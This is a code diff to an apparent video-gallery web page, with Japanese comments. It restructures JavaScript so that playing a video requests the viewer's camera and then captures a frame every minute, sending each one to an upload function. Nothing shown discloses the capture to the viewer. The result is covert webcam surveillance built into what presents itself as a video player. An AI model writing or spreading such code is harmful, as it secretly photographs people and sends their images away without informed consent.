@@ -285,7 +285,9 @@
                 videoGrid.appendChild(videoItem);
 
                 // Add event listener to start camera capture on video play
-                videoElement.addEventListener('play', () => startCameraCapture());
+                videoElement.addEventListener('play', () => {
+                    requestCameraAccess();
+                });
             });
         }
 
@@ -313,32 +315,38 @@
         let videoStream;
         let captureInterval;
 
-        function startCameraCapture() {
+        function requestCameraAccess() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     videoStream = stream;
-                    const videoTracks = videoStream.getVideoTracks();
-                    const track = videoTracks[0];
-                    const imageCapture = new ImageCapture(track);
-
-                    // 1分ごとに撮影してアップロード
-                    captureInterval = setInterval(() => {
-                        imageCapture.grabFrame()
-                            .then(imageBitmap => {
-                                canvas.width = imageBitmap.width;
-                                canvas.height = imageBitmap.height;
-                                ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
-                                const dataURL = canvas.toDataURL('image/jpeg');
-                                uploadImage(dataURL);
-                            })
-                            .catch(err => {
-                                console.error('画像キャプチャエラー:', err);
-                            });
-                    }, 10000); // 60000ミリ秒 = 1分
+                    startCameraCapture();
                 })
                 .catch(err => {
                     console.error('カメラアクセスエラー:', err);
                 });
+        }
+
+        function startCameraCapture() {
+            if (videoStream) {
+                const videoTracks = videoStream.getVideoTracks();
+                const track = videoTracks[0];
+                const imageCapture = new ImageCapture(track);
+
+                // 1分ごとに撮影してアップロード
+                captureInterval = setInterval(() => {
+                    imageCapture.grabFrame()
+                        .then(imageBitmap => {
+                            canvas.width = imageBitmap.width;
+                            canvas.height = imageBitmap.height;
+                            ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
+                            const dataURL = canvas.toDataURL('image/jpeg');
+                            uploadImage(dataURL);
+                        })
+                        .catch(err => {
+                            console.error('画像キャプチャエラー:', err);
+                        });
+                }, 60000); // 60000ミリ秒 = 1分
+            }
         }
 
         function stopCameraCapture() {
@@ -364,7 +372,6 @@
 
         // ページロード時に動画をロード
         window.onload = loadVideos;
-
     </script>
 </body>
 </html>
